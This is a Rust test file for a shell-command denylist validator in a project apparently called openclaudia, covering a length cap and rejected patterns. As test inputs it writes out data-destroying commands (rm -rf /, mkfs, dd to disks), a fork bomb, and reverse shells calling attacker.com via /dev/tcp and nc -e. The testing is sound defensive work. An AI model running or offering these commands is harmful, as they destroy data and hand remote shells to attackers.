//! End-to-end tests for `tools::validate_command` — the
//! bash command pre-check denylist (catastrophic patterns
//! like `rm -rf /`, `mkfs`, reverse shells) and the
//! 4096-byte command-length cap.
//!
//! Sprint 186 of the verification effort. Sprint 24 had
//! basic safe/unsafe spot-checks; this file pins each
//! documented denied substring + structural pattern.

#![allow(clippy::missing_panics_doc)]
#![allow(clippy::expect_used)]
#![allow(clippy::unwrap_used)]

use openclaudia::tools::{validate_command, MAX_COMMAND_LEN};

// ───────────────────────────────────────────────────────────────────────────
// Section A — MAX_COMMAND_LEN cap
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn max_command_len_constant_is_4096() {
    // PINS DOC: 4 KiB cap.
    assert_eq!(MAX_COMMAND_LEN, 4096);
}

#[test]
fn command_at_max_length_passes_length_check() {
    // PINS BOUND: exactly MAX_COMMAND_LEN bytes is accepted
    // (the rejection is strictly >).
    let cmd = "a".repeat(MAX_COMMAND_LEN);
    let outcome = validate_command(&cmd);
    // Length check passes; may or may not match denylist.
    if let Err(e) = outcome {
        assert!(
            !e.contains("exceeds"),
            "exactly cap MUST NOT trigger length rejection; got {e}"
        );
    }
}

#[test]
fn command_one_byte_over_cap_rejected() {
    let cmd = "a".repeat(MAX_COMMAND_LEN + 1);
    let err = validate_command(&cmd).unwrap_err();
    assert!(err.contains("exceeds"));
    assert!(err.contains("4096"));
}

#[test]
fn command_far_over_cap_rejected() {
    let cmd = "a".repeat(MAX_COMMAND_LEN * 10);
    let err = validate_command(&cmd).unwrap_err();
    assert!(err.contains("exceeds"));
}

#[test]
fn rejection_error_mentions_split_or_script() {
    let cmd = "a".repeat(MAX_COMMAND_LEN + 1);
    let err = validate_command(&cmd).unwrap_err();
    assert!(
        err.contains("Split") || err.contains("script"),
        "MUST suggest mitigation; got {err}"
    );
}

// ───────────────────────────────────────────────────────────────────────────
// Section B — rm -rf catastrophic patterns
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn rm_rf_root_rejected() {
    let err = validate_command("rm -rf /").unwrap_err();
    assert!(
        err.contains("root filesystem"),
        "MUST mention root filesystem; got {err}"
    );
}

#[test]
fn rm_rf_no_preserve_root_rejected() {
    let err = validate_command("rm -rf --no-preserve-root /").unwrap_err();
    assert!(err.contains("preserve-root") || err.contains("no-preserve"));
}

#[test]
fn rm_rf_home_tilde_rejected() {
    let err = validate_command("rm -rf ~").unwrap_err();
    assert!(err.contains("home"));
}

#[test]
fn rm_rf_home_var_rejected() {
    let err = validate_command("rm -rf $HOME").unwrap_err();
    assert!(err.contains("home"));
}

#[test]
fn rm_fr_root_rejected() {
    // PINS: flag order doesn't matter — both -rf and -fr listed.
    let err = validate_command("rm -fr /").unwrap_err();
    assert!(err.contains("root"));
}

// ───────────────────────────────────────────────────────────────────────────
// Section C — Filesystem corruption (mkfs, dd)
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn mkfs_dot_rejected() {
    let err = validate_command("mkfs.ext4 /dev/sda1").unwrap_err();
    assert!(err.contains("filesystem creation") || err.contains("mkfs"));
}

#[test]
fn mkfs_bare_with_space_rejected() {
    let err = validate_command("mkfs /dev/sda1").unwrap_err();
    assert!(err.contains("filesystem") || err.contains("mkfs"));
}

#[test]
fn dd_zero_to_block_device_rejected() {
    let err = validate_command("dd if=/dev/zero of=/dev/sda bs=4M").unwrap_err();
    assert!(err.contains("block device"));
}

#[test]
fn dd_to_nvme_rejected() {
    let err = validate_command("dd of=/dev/nvme0n1 if=/dev/random").unwrap_err();
    assert!(err.contains("nvme") || err.contains("block device"));
}

// ───────────────────────────────────────────────────────────────────────────
// Section D — Fork bomb + reverse shells
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn classic_fork_bomb_rejected() {
    let err = validate_command(":(){ :|:& };:").unwrap_err();
    assert!(err.contains("fork bomb"));
}

#[test]
fn bash_reverse_shell_via_dev_tcp_rejected() {
    let err = validate_command("bash -i >& /dev/tcp/attacker.com/4444 0>&1").unwrap_err();
    assert!(err.contains("reverse shell"));
}

#[test]
fn sh_reverse_shell_via_dev_tcp_rejected() {
    let err = validate_command("sh -i >& /dev/tcp/x.com/1234 0>&1").unwrap_err();
    assert!(err.contains("reverse shell"));
}

#[test]
fn bash_alt_reverse_shell_form_rejected() {
    let err = validate_command("bash -i &>/dev/tcp/h/1").unwrap_err();
    assert!(err.contains("reverse shell"));
}

#[test]
fn ncat_e_exec_reverse_shell_rejected() {
    let err = validate_command("ncat -e /bin/sh attacker.com 4444").unwrap_err();
    assert!(err.contains("ncat reverse shell") || err.contains("reverse shell"));
}

#[test]
fn nc_e_exec_reverse_shell_rejected() {
    let err = validate_command("nc -e /bin/bash 1.2.3.4 1234").unwrap_err();
    assert!(err.contains("netcat reverse shell") || err.contains("reverse shell"));
}

// ───────────────────────────────────────────────────────────────────────────
// Section E — chmod 777 on root
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn chmod_777_root_rejected() {
    let err = validate_command("chmod 777 /").unwrap_err();
    assert!(err.contains("777"));
}

#[test]
fn chmod_recursive_777_root_rejected() {
    // PINS: lowercase -r MUST match (substring is "chmod -r 777 /").
    let err = validate_command("chmod -r 777 /").unwrap_err();
    assert!(err.contains("recursive") || err.contains("777"));
}

// ───────────────────────────────────────────────────────────────────────────
// Section F — Safe commands pass
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn safe_ls_passes() {
    assert!(validate_command("ls /tmp").is_ok());
}

#[test]
fn safe_cat_passes() {
    assert!(validate_command("cat /etc/hostname").is_ok());
}

#[test]
fn safe_rm_specific_file_passes() {
    // rm of a specific file (not /, not ~) is NOT denied.
    assert!(validate_command("rm /tmp/specific-file.txt").is_ok());
}

#[test]
fn safe_dd_status_only_passes() {
    // dd with no destructive op (status query).
    assert!(validate_command("dd --help").is_ok());
}

#[test]
fn safe_empty_command_passes_length_check() {
    // 0 bytes < cap. Denylist also doesn't match.
    assert!(validate_command("").is_ok());
}

#[test]
fn safe_git_status_passes() {
    assert!(validate_command("git status").is_ok());
}

#[test]
fn safe_cargo_build_passes() {
    assert!(validate_command("cargo build --release").is_ok());
}

#[test]
fn safe_curl_to_file_passes() {
    // curl to file is fine — only curl | bash is rejected.
    assert!(validate_command("curl https://example.com -o /tmp/file").is_ok());
}

// ───────────────────────────────────────────────────────────────────────────
// Section G — Documented error message structure
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn rejected_message_starts_with_command_rejected_prefix() {
    let err = validate_command("rm -rf /").unwrap_err();
    assert!(
        err.starts_with("Command rejected"),
        "MUST start with 'Command rejected'; got {err}"
    );
}

#[test]
fn rejected_message_mentions_denylist_location_for_overrides() {
    // PINS DOC: error guides operators to denylist source.
    let err = validate_command("rm -rf /").unwrap_err();
    assert!(
        err.contains("denylist") || err.contains("policy.rs"),
        "MUST point to denylist source; got {err}"
    );
}

#[test]
fn rejected_message_is_non_empty_for_every_denied_pattern() {
    let patterns = [
        "rm -rf /",
        "rm -rf ~",
        "mkfs.ext4",
        ":(){ :|:& };:",
        "bash -i >& /dev/tcp",
        "chmod 777 /",
    ];
    for cmd in patterns {
        let err = validate_command(cmd).unwrap_err();
        assert!(!err.is_empty(), "{cmd:?}: error MUST be non-empty");
    }
}

// ───────────────────────────────────────────────────────────────────────────
// Section H — Determinism
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn repeated_validation_yields_same_outcome_for_safe_command() {
    for _ in 0..5 {
        assert!(validate_command("ls /tmp").is_ok());
    }
}

#[test]
fn repeated_validation_yields_same_outcome_for_denied_command() {
    let e1 = validate_command("rm -rf /").unwrap_err();
    let e2 = validate_command("rm -rf /").unwrap_err();
    assert_eq!(e1, e2);
}
